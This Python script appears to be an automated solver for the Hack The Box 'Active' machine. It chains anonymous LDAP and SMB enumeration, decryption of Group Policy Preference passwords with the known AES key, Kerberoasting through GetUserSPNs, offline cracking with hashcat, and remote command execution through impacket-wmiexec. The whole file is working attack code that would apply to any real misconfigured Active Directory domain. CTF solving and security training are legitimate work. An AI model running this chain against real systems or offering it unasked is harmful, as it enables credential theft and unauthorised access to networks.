import time
import coloredlogs, logging
import argparse
from io import BytesIO
import subprocess

from impacket.smbconnection import SMBConnection, SessionError
from tempfile import mkdtemp, mkstemp
from gitleaks_py import gitleaks_command as gl_c, gitleaks_model as gl_m
import requests
from defusedxml import ElementTree
from Crypto.Cipher import AES
import base64

import ldap3

# https://app.hackthebox.com/machines/Active

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)
coloredlogs.install(level='DEBUG')

parser = argparse.ArgumentParser(prog='WindowsSolver')
parser.add_argument('--ip', help='target IP', required=True)

_fid, GITLEAKS_DEFAULT_CONFIG_FILE = mkstemp()

with open(GITLEAKS_DEFAULT_CONFIG_FILE, "w") as cfg:
    cfg.write(requests.get(gl_m.GITLEAKS_DEFAULT_CONFIG_FILE).text)

credentials = {}

def save_creds(username, password):
    credentials[username] = password

ad_infos = {}

def query_ldap_ad(ip):
    server = ldap3.Server(f"ldap://{ip}", get_info=ldap3.ALL)
    connection = ldap3.Connection(server, user="", password="", auto_bind=True)
    info = server.info
    ad_infos['naming_context'] = info.naming_contexts[0]
    ad_infos['domain'] = info.other['ldapServiceName'][0].split(':')[0]

def decrypt(cpass):
    """
        From https://github.com/t0thkr1s/gpp-decrypt/blob/c71c7a6c3c8d251bf1b66050a00b9bb53362d326/gpp-decrypt.py#L21C1-L30C65
    """
    padding = '=' * (4 - len(cpass) % 4)
    epass = cpass + padding
    decoded = base64.b64decode(epass)
    key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8' \
          b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
    iv = b'\x00' * 16
    aes = AES.new(key, AES.MODE_CBC, iv)
    return aes.decrypt(decoded).decode(encoding='ascii').strip()

def list(share_name, path, depth):
    tmp_dir = mkdtemp()
    for f in connection.listPath(share_name, path + "/*"):
        name = f.get_longname()
        if f.is_directory() and name in ['.', '..']:
             continue

        logger.warning("  "*depth +  "%crw-rw-rw- %10d  %s %s" % ('d' if f.is_directory() > 0 else '-', f.get_filesize(), time.ctime(float(f.get_mtime_epoch())), name))
        if f.is_directory():
            list(share_name, path + "/" + name, depth + 1)
        else:
            fh = BytesIO()
            connection.getFile(share_name, path + "/" + name, fh.write)
            output = fh.getvalue()
            with open(tmp_dir + "/" + name, "wb") as f_smb:
                f_smb.write(output)

            if name == "Groups.xml":
                tree = ElementTree.fromstring(output)
                user = tree.find('User')
                if user is not None:
                    properties = user.find('Properties')
                    username = properties.attrib.get('userName')
                    cpass = properties.attrib.get('cpassword')
                    decrypted_pass = decrypt(cpass).encode().decode("utf-16")
                    logger.warning(f"New credentials found : {username}:{decrypted_pass}")
                    save_creds(username, decrypted_pass)
    logger.info("Scanning " + tmp_dir)
    logger.info(gl_c.detect(GITLEAKS_DEFAULT_CONFIG_FILE, tmp_dir))


def ldap_find_kerberoasting(ip, username, password):
    escaped_username = username.replace("\\", "/")
    get_user_spns_command = ["GetUserSPNs.py", escaped_username + ":" + password, "-dc-ip", ip, "-request"]
    print(get_user_spns_command)
    result = subprocess.run(get_user_spns_command, capture_output=True, text=True, check=True)
    output = result.stdout
    
    with open("hash.txt", "a") as hash_file:
        for line in output.splitlines():
            if line.startswith("$krb5tgs$"):
                hash_file.write(line + "\n")

def crack_hashes():
    logger.warning("Hashcat in progress...")
    hashcat_command = ["hashcat", "-a", "0", "-m", "13100", "hash.txt", "/usr/share/wordlists/rockyou.txt", "--quiet"]
    result = subprocess.run(hashcat_command, check=True, capture_output=True)
    output = result.stdout
    logger.info(output)

    for line in output.split(b"\n"):
        if line.startswith(b"$krb5tgs$"):
            components = line.split(b"$")
            username = components[3].decode()
            if username[0] == '*':
                username = username[1:]
            password = b":".join(components[-1].split(b":")[1:])
            logger.warning(f"Found new creds: {username}:{password}")
            save_creds(username, password.decode())

def test_wmiexec(ip, domain, username, password):
    wmiexec_command = ["impacket-wmiexec", f"{domain}/{username}:{password}@{ip}", 'whoami /all']
    result = subprocess.run(wmiexec_command, capture_output=True)
    if result.returncode == 0:
        logger.warning(f"Getting access to shell with {username}:{password}")
        output = result.stdout
        logger.info(output.decode())

if __name__ =="__main__":
    args = parser.parse_args()
    ip = args.ip

    query_ldap_ad(ip)

    logger.warning(f"Domain: {ad_infos['domain']}")

    connection = SMBConnection(remoteName = ip, remoteHost = ip)
    connection.login(user='', password='')

    logger.info("Listing shares")
    shares = connection.listShares()
    logger.info(f"Number of shares found: {len(shares)}")
    for s in shares:
        share_name = s.fields['shi1_netname'].fields['Data'].fields['Data'].decode("utf-16le")[:-1]
        base_msg = " %r : " %(share_name)
        try:
            connection.connectTree(share_name)
            logger.warning(base_msg + "Readable")
            list(share_name, '', depth = 0)
        except SessionError as e:
            logger.info(base_msg + "Not readable")
            logger.debug(e)

    for username, password in credentials.items():
        ldap_find_kerberoasting(ip, username, password)

    crack_hashes()

    for username, password in credentials.items():
        test_wmiexec(ip, ad_infos['domain'], username, password)


